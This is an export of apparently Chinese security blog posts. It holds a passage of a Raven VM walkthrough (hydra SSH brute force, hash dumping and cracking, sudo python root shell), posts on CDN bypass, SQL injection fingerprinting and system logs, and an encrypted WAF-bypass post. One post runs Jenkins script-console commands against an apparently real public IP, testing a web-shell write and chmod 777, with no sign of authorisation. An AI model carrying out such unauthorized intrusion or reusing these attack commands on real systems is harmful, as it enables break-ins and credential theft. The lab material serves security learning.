<h4 id="开始对ssh爆破"><a href="#开始对ssh爆破" class="headerlink" title="开始对ssh爆破"></a>开始对ssh爆破</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//收集信息</span><br><span class="line"><span class="meta">$</span><span class="bash">cewl http://192.168.222.161/wordpress/ -d 3 -w raven1.txt</span></span><br><span class="line">//发现该字典中没有刚才我们找到的名字，添加进去</span><br><span class="line">//开始爆破</span><br><span class="line"><span class="meta">$</span><span class="bash">hydra -l michael -P raven1.txt ssh://192.168.222.161</span></span><br><span class="line"></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-14 21:29:01</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 69 login tries (l:1/p:69), ~5 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.222.161:22/</span><br><span class="line">[22][ssh] host: 192.168.222.161   login: michael   password: michael</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 1 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 1 target did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-14 21:29:04</span><br></pre></td></tr></table></figure>

<p>成功爆破出ssh账号和密码为<code>login: michael   password: michael。</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">ssh michael@192.168.222.161</span></span><br><span class="line">//输入密码后成功登录</span><br><span class="line"><span class="meta">$</span><span class="bash">michael@Raven:~$</span></span><br></pre></td></tr></table></figure>

<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>在<code>/var/www</code>目录下看见了<code>flag2</code></p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415080951.png" alt="image-20200415080949790"></p>
<h4 id="查看特权"><a href="#查看特权" class="headerlink" title="查看特权"></a>查看特权</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm 4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415082014.png" alt="image-20200415082011478"></p>
<p>可以看见michael用户对这些命令用于suid权限，但不知道如何利用</p>
<h4 id="查看mysql配置"><a href="#查看mysql配置" class="headerlink" title="查看mysql配置"></a>查看mysql配置</h4><p>居然忘记了查看这个配置，一般搭建网站的时候都需要连接数据库的，mysql配置文件一般保存在网站目录那附近。在wordpress/wp-config.php中发现了mysql配置</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415083806.png" alt="image-20200415083805065"></p>
<p>尝试利用该密码登录ssh，失败，直接登录mysql数据库</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415085108.png" alt="image-20200415085103586"></p>
<p>发现两个用户</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415085228.png" alt="image-20200415085227097"></p>
<h4 id="flag3-amp-amp-flag4"><a href="#flag3-amp-amp-flag4" class="headerlink" title="flag3 &amp;&amp; flag4"></a>flag3 &amp;&amp; flag4</h4><p>直接在数据库中的wp_posts表中查到了flag3和flag4？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from wp_posts;</span><br><span class="line">#发现select * from wp_posts\G;能让数据更加整齐</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415085451.png" alt="image-20200415085450028"></p>
<h4 id="破解数据库密码"><a href="#破解数据库密码" class="headerlink" title="破解数据库密码"></a>破解数据库密码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT CONCAT(user_login, &quot;:&quot;, user_pass) FROM wp_users INTO OUTFILE&#39;&#x2F;tmp&#x2F;wordpress.txt&#39;;</span><br><span class="line"></span><br><span class="line">michael@Raven:&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress$ cat &#x2F;tmp&#x2F;wordpress.txt </span><br><span class="line">michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0</span><br><span class="line">steven:$P$Bk3VD9jsxx&#x2F;loJoqNsURgHiaB23j7W&#x2F;</span><br><span class="line"></span><br><span class="line">#复制其中内容，在kali下生成wordpress.txt文件，使用john破解</span><br><span class="line">$sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt wordpress.txt</span><br></pre></td></tr></table></figure>

<p>![image-20200415095509722](D:/Program Files/Typora/upload/image-20200415095509722.png)</p>
<h4 id="使用这个账号登录"><a href="#使用这个账号登录" class="headerlink" title="使用这个账号登录"></a>使用这个账号登录</h4><p>成功登录ssh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//列出目前用户可执行与无法执行的指令；</span><br><span class="line"><span class="meta">$</span><span class="bash">sudo -l</span></span><br><span class="line">Matching Defaults entries for steven on raven:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User steven may run the following commands on raven:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python</span><br><span class="line"></span><br><span class="line">//提权，在root目录下发现第四个flag</span><br><span class="line"><span class="meta">$</span><span class="bash">sudo python -c <span class="string">'import os; os.system("/bin/sh")'</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">flag4.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat flag4.txt </span></span><br><span class="line">______                      </span><br><span class="line"></span><br><span class="line">| ___ \                     </span><br><span class="line"></span><br><span class="line">| |_/ /__ ___   _____ _ __  </span><br><span class="line"></span><br><span class="line">|    // _` \ \ / / _ \ '_ \ </span><br><span class="line"></span><br><span class="line">| |\ \ (_| |\ V /  __/ | | |</span><br><span class="line"></span><br><span class="line">\_| \_\__,_| \_/ \___|_| |_|</span><br><span class="line"></span><br><span class="line">                            </span><br><span class="line">flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;</span><br><span class="line"></span><br><span class="line">CONGRATULATIONS on successfully rooting Raven!</span><br><span class="line"></span><br><span class="line">This is my first Boot2Root VM - I hope you enjoyed it.</span><br><span class="line"></span><br><span class="line">Hit me up on Twitter and let me know what you thought: </span><br><span class="line"></span><br><span class="line">@mccannwj / wjmccann.github.io</span><br></pre></td></tr></table></figure>

<p>而之前的<code>michael</code>用户运行<code>sudo -l</code>时需要输入密码</p>
<h4 id="sudo提权原理"><a href="#sudo提权原理" class="headerlink" title="sudo提权原理"></a>sudo提权原理</h4><p>查看<code>/etc/sudoers</code>文件（提权后查看）</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200415104918.png" alt="image-20200415104917379"></p>
<p>可以看见不需要密码就能以root权限执行python命令，应该算是配置不当吧</p>
<h4 id="尝试对-etc-shadow的root账号密码进行破解"><a href="#尝试对-etc-shadow的root账号密码进行破解" class="headerlink" title="尝试对/etc/shadow的root账号密码进行破解"></a>尝试对/etc/shadow的root账号密码进行破解</h4><h5 id="shadow文件解析"><a href="#shadow文件解析" class="headerlink" title="shadow文件解析"></a>shadow文件解析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;加密后的口令密码&#125;的格式为 $id$salt$encrypted</span><br><span class="line">id为1时，采用md5算法加密</span><br><span class="line">id为5时，采用SHA256算法加密</span><br><span class="line">id为6时，采用SHA512算法加密</span><br><span class="line">salt为盐值,是对密码进行hash的一个干扰值</span><br><span class="line">encrypted为散列值</span><br></pre></td></tr></table></figure>

<p>同样使用john来破解，只需要将/etc/shadow文件root那一行拷贝出来，复制到kali的shadow.txt文件中。但是没有破解成功。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li><p>信息收集要细，渗透思路要清晰</p>
</li>
<li><p>使用cewl和cupp生成密码字典</p>
</li>
<li><p>使用john爆破hash密码</p>
</li>
<li><p>sudo提权，可以参考<a href="[https://evilanne.github.io/2019/07/24/sudo%E6%8F%90%E6%9D%83/](https://evilanne.github.io/2019/07/24/sudo提权/)">这篇文章</a></p>
</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><code>hack学习</code>公众号文章</p>
]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>jenkins未授权</title>
    <url>/2020/03/31/JenKins%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Jenkins利用"><a href="#Jenkins利用" class="headerlink" title="Jenkins利用"></a>Jenkins利用</h2><a id="more"></a>







<blockquote>
<p><strong>目标</strong>：<a href="http://5.196.89.136:8090/script" target="_blank" rel="noopener">http://5.196.89.136:8090/script</a></p>
</blockquote>
<h4 id="查看是否能够出网"><a href="#查看是否能够出网" class="headerlink" title="查看是否能够出网"></a>查看是否能够出网</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ping -c 3 www.baidu.com&quot;.execute().text</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135353.png" alt="image-20200327135351787"></p>
<p>结果显示可以。</p>
<h4 id="查看web路径"><a href="#查看web路径" class="headerlink" title="查看web路径"></a>查看web路径</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;httpd -V&quot;.execute().text</span><br></pre></td></tr></table></figure>





<h4 id="目录列举"><a href="#目录列举" class="headerlink" title="目录列举"></a>目录列举</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ls &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135651.png" alt="image-20200327135649845"></p>
<h4 id="写入Web-shell测试"><a href="#写入Web-shell测试" class="headerlink" title="写入Web shell测试"></a>写入Web shell测试</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;).write(&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327140018.png" alt="image-20200327140016826"></p>
<p>发现没有写入权限。</p>
<h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;chmod 777 &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>



<h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p><a href="https://www.cnblogs.com/cwkiller/p/12578924.html" target="_blank" rel="noopener">CVE-2018-1000861复现</a></p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>未授权</tag>
      </tags>
  </entry>
  <entry>
    <title>cdn绕过</title>
    <url>/2020/03/30/cdn%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h2><h3 id="什么是cdn"><a href="#什么是cdn" class="headerlink" title="什么是cdn"></a>什么是cdn</h3><p>​    CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
<a id="more"></a>

<p>​    当服务器很远时，访问的速度会收到影响，cdn可以理解为一个缓存节点，可以从距离自己很近的cdn节点来获取数据而不是真实服务器。当网站开启cdn加速后，我们访问这个网站时，访问到的不是服务器的真实ip地址，而只是一个缓存节点。</p>
<p>​    </p>
<h3 id="怎么检测是否存在cdn？"><a href="#怎么检测是否存在cdn？" class="headerlink" title="怎么检测是否存在cdn？"></a>怎么检测是否存在cdn？</h3><ul>
<li><p>多地ping（超级ping）——如果全国各地访问的是同一个ip，则很明显没有使用cdn加速。下面是使用cdn加速的网站截图。<br><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330134015.png" alt="image-20200330134013660"></p>
</li>
<li><p>nslookup——看非权威应答返回的ip数量，当数量只有一个时明显没有使用cdn。（感觉这个方法不是很可靠，下面是反例）<br><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330134651.png" alt="image-20200330134649941"></p>
</li>
<li><p>使用<a href="https://www.cdnplanet.com/tools/cdnfinder/#site:https://www.lenovo.com" target="_blank" rel="noopener">cdn工具</a>查看</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330134538.png" alt="image-20200330134533284"></p>
</li>
</ul>
<h3 id="如何绕过cdn得到真实ip"><a href="#如何绕过cdn得到真实ip" class="headerlink" title="如何绕过cdn得到真实ip"></a>如何绕过cdn得到真实ip</h3><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><p>​    开启cdn需要一定费用，很多企业只会选择重要的主站开启cdn加速服务，而其他访问量较少的子站则没有，但是可能存在主站和子站在同一服务器（ip地址）上的情况。</p>
<h4 id="国外地址查询"><a href="#国外地址查询" class="headerlink" title="国外地址查询"></a>国外地址查询</h4><p>​    利用国内和国外的访问人数的不同，有些公司在国内用户很多，而在国外没有太多用户，所以只在国内开启了cdn服务，国外没有开启，因此可以通过国外访问来获取真实ip。</p>
<h4 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h4><p>​    很多网站注册的时候会绑定邮箱，收到一些从服务器发来的邮件，可以通过查找邮件来源来获取真实ip地址。或者可以想办法从目标服务器向外发出邮件，比如使用RSS邮件订阅。</p>
<p>​    得到邮件后查看邮件原文如下</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330143235.png" alt="image-20200330143234135"></p>
<h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><ul>
<li>通过敏感文件，如phpinfo，GitHub信息泄露等</li>
</ul>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330135834.png" alt="image-20200330135832062"></p>
<ul>
<li><p>扫全网——扫描全球各地同时请求，利用不可能全球各国全部使用cdn这个假说。</p>
</li>
<li><p>dns历史记录——查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录。</p>
</li>
<li><p>黑暗引擎（shodan，fofa …）——成功率不高，利用网站刚建立就被这些引擎扫描到，而这时没有开启cdn。</p>
</li>
<li><p>ping的不同姿势——可能设置cdn的域名是<code>www.baidu.com</code>而不是<code>baodu.com</code> (我不知道是否可靠)</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330141254.png" alt="image-20200330141245899"></p>
</li>
<li><p>一些查询网站查询真实ip</p>
<p><code>https://get-site-ip.com/</code></p>
</li>
</ul>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200330142045.png" alt="image-20200330142044085"></p>
<ul>
<li>SSL证书查询——使用<code>Censys</code></li>
</ul>
<h3 id="cdn工具使用"><a href="#cdn工具使用" class="headerlink" title="cdn工具使用"></a>cdn工具使用</h3><h4 id="w8fuckcdn"><a href="#w8fuckcdn" class="headerlink" title="w8fuckcdn"></a>w8fuckcdn</h4><blockquote>
<p>通过扫描全网绕过CDN获取网站IP地址</p>
</blockquote>
<p>项目地址: <code>https://github.com/boy-hack/w8fuckcdn</code></p>
<p>用法: <code>python get_ips.py -d baidu.com</code></p>
<p>本来想使用一下的，结果运行报错，还是直接调用masscan感觉有点不太行。</p>
]]></content>
      <categories>
        <category>web渗透</category>
      </categories>
      <tags>
        <tag>cdn</tag>
      </tags>
  </entry>
  <entry>
    <title>sql参数化</title>
    <url>/2020/03/29/sql%E5%8F%82%E6%95%B0%E5%8C%96/</url>
    <content><![CDATA[<h2 id="sql参数化"><a href="#sql参数化" class="headerlink" title="sql参数化"></a>sql参数化</h2><p>sql参数化可以从根本上防止sql注入，sql注入的根本在于用户恶意拼接sql语句，数据库会将整个sql语句执行，而sql参数化采用预编译的方式，将用户输入的数据作为参数处理。下面是一段网上的java的预编译代码，很好理解。</p>
<a id="more"></a>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line">String sql = <span class="string">"select * from user where username=? and passwd=?"</span>;</span><br><span class="line">ps = conn.PreparedStatement(sql);</span><br><span class="line">ps.setString(<span class="number">1</span>, <span class="string">"admin"</span>);</span><br><span class="line">ps.setString(<span class="number">2</span>, <span class="string">"123456"</span>);</span><br><span class="line">resultSet = ps.executeQuery();</span><br></pre></td></tr></table></figure>

<p>在这段代码中就不会存在sql拼接的现象，即使用户输入<code>username</code>=<code>admin‘ or 1=1</code>，数据库在执行时只会把这个当做一个用户，去查询有没有<code>admin‘ or 1=1</code>的用户。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="https://www.zhihu.com/question/52869762" target="_blank" rel="noopener">https://www.zhihu.com/question/52869762</a></p>
</blockquote>
<h3 id="sql数据库识别"><a href="#sql数据库识别" class="headerlink" title="sql数据库识别"></a>sql数据库识别</h3><p>常见的数据库一般有mysql，access，oracle，postgresql，sqlserver（mssql) 这五类</p>
<h4 id="根据框架组合识别"><a href="#根据框架组合识别" class="headerlink" title="根据框架组合识别"></a>根据框架组合识别</h4><table>
<thead>
<tr>
<th align="center">框架</th>
<th align="center">常用数据库</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Asp和。net</td>
<td align="center">sqlserver</td>
</tr>
<tr>
<td align="center">php</td>
<td align="center">mysql和postgesql</td>
</tr>
<tr>
<td align="center">java</td>
<td align="center">oracle和mysql</td>
</tr>
<tr>
<td align="center">iis（基于windows）</td>
<td align="center">sqlserver</td>
</tr>
<tr>
<td align="center">apache</td>
<td align="center">mysql和postgresql</td>
</tr>
<tr>
<td align="center">asp</td>
<td align="center">access和sqlserver</td>
</tr>
</tbody></table>
<h4 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h4><p>在参数后面加个’或者”如<code>id=1&#39;</code>尝试引发报错，通过回显错误信息判断</p>
<p>对于<code>acecss</code>数据库会回显<code>Microsoft JET Database Engine 错误’80040e14</code> </p>
<p>对于<code>sqlserver</code>数据库会回显<code>ODBC</code>,<code>Msg</code></p>
<p>对于<code>mysql</code>数据库会回显<code>you have an error in your SQL syntax</code></p>
<p>对于<code>oracle</code>数据库会回显<code>ora-错误编号</code></p>
<h4 id="特定连接符判断"><a href="#特定连接符判断" class="headerlink" title="特定连接符判断"></a>特定连接符判断</h4><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">连接符查询</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysql</td>
<td align="center">select ‘str’’ing’ <br />select concat(‘str’,’’ing)<br /> select ‘str’+’ing’</td>
</tr>
<tr>
<td align="center">sqlserver</td>
<td align="center">select ‘str’+’ing’</td>
</tr>
<tr>
<td align="center">oracle</td>
<td align="center">select ‘str’||’ing’ <br />select concat(‘str’,’’ing)</td>
</tr>
</tbody></table>
<h4 id="通过不同数据库特有的表判断"><a href="#通过不同数据库特有的表判断" class="headerlink" title="通过不同数据库特有的表判断"></a>通过不同数据库特有的表判断</h4><table>
<thead>
<tr>
<th align="center">数据库</th>
<th align="center">特有的表</th>
</tr>
</thead>
<tbody><tr>
<td align="center">mysql（&gt;5.0）</td>
<td align="center">information_schema.TABLES</td>
</tr>
<tr>
<td align="center">sqlserver</td>
<td align="center">sysobjects</td>
</tr>
<tr>
<td align="center">oracle</td>
<td align="center">sys.user_tables</td>
</tr>
<tr>
<td align="center">access</td>
<td align="center">msysobjects</td>
</tr>
</tbody></table>
<p>在存在注入点的情况下可以使用以下用法判断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from 特有表名)&gt;0 and 1&#x3D;1</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Web漏洞基础知识</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>日志</title>
    <url>/2020/03/29/%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>做了下实习笔试题，在日志这块上不是很了解，答得很糟，所以现在学习总结一下。</p>
<a id="more"></a>

<h3 id="查看win10日志"><a href="#查看win10日志" class="headerlink" title="查看win10日志"></a>查看win10日志</h3><p>在<code>事件处理器</code>中可以看到，不过要以管理员运行。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200329085145.png" alt="image-20200329085144198"></p>
<p>可以看到win10的日志分了以下几个模块</p>
<ul>
<li>应用程序</li>
<li>安全</li>
<li>Setup</li>
<li>系统</li>
<li>Forwarded Events</li>
</ul>
<p>点击右边侧栏中的属性选项可以看到该日志文件的存放位置</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200329085638.png" alt="image-20200329085636402"></p>
<p>所以这五个日志模块的存放位置是在<code>C:\Windows\System32\winevt\Logs</code>下，该目录下有很多小的日志文件可能是其他系统服务的日志文件</p>
<p>应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx</p>
<p>安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx</p>
<p>安装日志：%SystemRoot%\System32\Winevt\Logs\Setup.evtx</p>
<p>系统日志： %SystemRoot%\System32\Winevt\Logs\System.evtx</p>
<p>Forwarded Event日志：%SystemRoot%\System32\Winevt\Logs\ForwardedEvents.evtx</p>
<h3 id="linux日志"><a href="#linux日志" class="headerlink" title="linux日志"></a>linux日志</h3><p>linux的日志文件存放在<code>/var/log/</code>下。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200329090719.png" alt="image-20200329090718478"></p>
<p><strong>/var/log/faillog –包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</strong></p>
<p><strong>/var/log/btmp –包含所有失败登录信息</strong></p>
<p>该目录下处理系统日志以外，还包括了apache2，mysql等应用的日志。</p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过安全狗</title>
    <url>/2020/03/29/%E6%9C%AC%E5%9C%B0%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97%E5%B0%9D%E8%AF%95/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="9c6188e81121a6897f28be5d45c4ec416d48ce64e6cc0e23b187001073f40fb9">4bbcdeaba4bf0c5e9e300d5a28672b5e2c7acdb42956a95f7be2b5acaec3f8f109659f846dedb79dfe05ea7ae6eb0ce008d64b105be8303d323e42789799bd1c0f8a59d32ab54a71b3a73ef823c308ad918fb35cb2ed37c2f65878e07da5ef5aa40454359a5ee175ebc830fde9d4598cb704467ffaaea307c2b8a52f8bbf0907a1526975eb26f210e66af36d61e32313a4994a2f707a5fe54af37c61a306135a837d10481680d0fc97a44741934e36f1ed909903b928d5bfa3d5894ef9fc98b02e59bd78cb62bb659bb3237e8de66daba17e02abd730c36f4a6933627c4da0dae2ea8288ac06cc45edf0f634a2c9d4aca1da9ad5194efa8dc906326a230c9128642a3e4fbe74b07c243e1cde8f9cd275ed601f2e0dbed2aa3e866091f502389a9aec15aad8bbe78bfa1ac30e7f5e326323283ec54de090c588309006c4979d31391934ca07aea0bad176a7d1a2052662c99c4cd9471bdc43c4e5a5a0154372c8e32e5da8eaf409fcd62f7280afaf1127ffe4caa668ea68bd706532541c8350adb7c41a67adad65109f536cb8c86ee4d4cdd1b3720efaafb48a9fdc90b7b287d247e991eb55dd97d9e6d4423d34cab5c6de0b04e5e41c4c7270b3fd77088b83c5c3f8d32a676a3e85de548a1f87975009ab7b7a7bce9d925c4d25afb34076c4ad1e1be52d4ad4b6427f8adfa1194ed01b8c01fccf3104ad3bedf3a43f85383ca74dfcda697669fe636a29639b3e07fc56c99f24d8d239568118c9165a53202be97fd0c7cd967676180a177b872b1b15b3e4e827fd427597514c9a8b69fd02f4b7623640a5d2974d5d7cc9b5218eba3e0b3a4f6b8493bca8174c1e296fcc9a51fbdd478d5e604c90dae6334a5ad04838f8c31e78ddf5c1a0deb687da49ae3202edee80297555054f50a6b49bd44aee26b7ebb94dd7ce422c5e95c5a57df1495a5b589d951e292f6ff4356a97e3481b5f86373be3406c286c5fe5cf7b687ec1961e556a56566c7731b825af88eb48a502093ebd9db627e638d4c454a0eea9a651d0ff509c6992487e402f6083e2c4b4e0a65f1fb583d2d5c52a75222fd037dc081fd1570def12d1f79f846accf854e9a054e645220a265868f5cd87a76faea65f9cb6b76b590dbae3ab219cdbcaea6ef5fcf4d7080abf1d057eb4993e72898bdeaf35988198a432af7a5536be3b33f9b6141f38c5fb6c8f6f24171888f5cc4f72c39915279b92df0506026842105cf3fbc0fa5fc72766c38578c555c3a705d516d747e036525e216073482c1da0dedff9e43aabd2180b04491357ba70f3fef532097c9991e9de8256ecdc442483ddc9bc0c6f83e2020878046598c5abb625a7e1f3c9319e453637e3e0b30a05b0a8e8edf809702851761ec100005634c79e2eef93bc02491a0bbef089878bb31a397a383273c941c956f972cad8778d21c80b7ce7ccc76f0f8fea31b23370a9bfa856d900f106342b7f20ebe3a776b13aa071f878e13b1d1d5d8f764df4c81f09091db8ff153934a0b3f7883799361f339d1b8f2cce72ed849261c7784e0deb4bd0f1036a850abd42e7329746abaa50530e9c9202c9d1327cb307ed58a0840c24d9ae06857aeb15ce17cf937988607dbf104063a9223064faf559a4af812e59226f99bbef41809ec76b3e2e8fafa50ea4361abc177fae41e3c2cfc7f9e974f318644c1fe00caabc2922e2f0405bc9e2880d6622f89c2fb5a58b283a2713c6043c313c71cb03dc09eb8c88c0c4f19610455ca175f1229778de23b03a8c8e6ad1c580698d95d54b5e9a6990a96bb901a44f185d35aa5530816b32f749a43e4c3fdcb9546324b712571aea0b819f02ccad4c3288d80b29fc2a57055fa5cea6f6101f3014f5019f979f049088122da058d94f7ea4dcaf8f1f20061c7d48c30e06c223188a178ce2ac948c3d2694f3160e31d6ab75a2e8c7d21774c2f070305fbe15f90cf8888ed4055544c1c0ebefffb254844b42e8d196ce796292b9302d16440e406d8e000535cae205b72e96743c305e5dd05bfb1a9dddb2bb02e4e29ed463f68a235bc31844a435d8702d75a547598a27a223b4f3f1968ba291fe1eae873dcdae8cb6c937a5b9dd80fec12e8cae3f30ad5dbecdc025b85c6633342aa552540072f5e2d1919078a772dccb194681696a7c83a238d9b3a2f0c815bb154d1b03d50d6fb5e01f49b1f014a5c5021fe95c948ba1e27a699cae9474a06d8323e5f6839d6229d40262fccb2cbb76f1576ca9ee394b3411f5d39f98f19c367a28c3dae904f249935261fb7e6f37cbca3d6150715fea4ff797a10f1341460d74c1073fa7c2555c54267f8bc00dbe31bd4c5adc7362d86770fc8c5ce67c359541ad30bba236ea0efc74f3e21b893bd63b04c46c5bbf9badc53c5a68c8caffc756f5cabfe3b990c2916cf92e4afb8c5ca1d2a92330a4d3329ae9ed6c46360e20e3a30b0b3174250df3d78c4480c81e4f83e44162bf66ec51ff6eb8c03408d2bb347e71689241edfd16b99a5e5c0cc41ed1e1af3c1ba82b7364e18f3340bc2d51564b4db070e490f4ea4278fbe339a851fd030f37b35b01a9c08cfee4ae06494a1a845ac529ee3025b16f698af755bee3bed84831ca0381dfb73fde4ad42e6023dbadd1e8b7bd3caf15cb9351c287efbfdebc06124b457bde1326afe4eea7abc5d5d262949e34ce11e3901ac17466a2f79b54779d49212e6c20d85232e703fdd777bf8da92c6f8c7beefdfc09735b73016bfc637fcaff851d791ca7ae116484094c17d019abac5ec4801aa834ef72b5998079d5cd03d549d71cd5bcd750c62a206e09dc3083532c7e111ee3a3fdf380d3a4b33cc3f740de5f872c32474ed55eb0a8507787d6788ffa2ba6318417c2db3fa335f40c09e0a897e188f78f49161b7ff25f7058405ff113bb34f5255c3206a4ca2666c0e90252ab16f5f5993f66b7df9a2a0f6972b994c7a72c7169cb0cf5ab78747a3a2eb4f725f23cbcec42d421e19798cddd057654a1756ecae1069ace762e71c802b054df89dd283ec32d394af9fe9a1f3cd9a9281bf1e91048e56b3d7938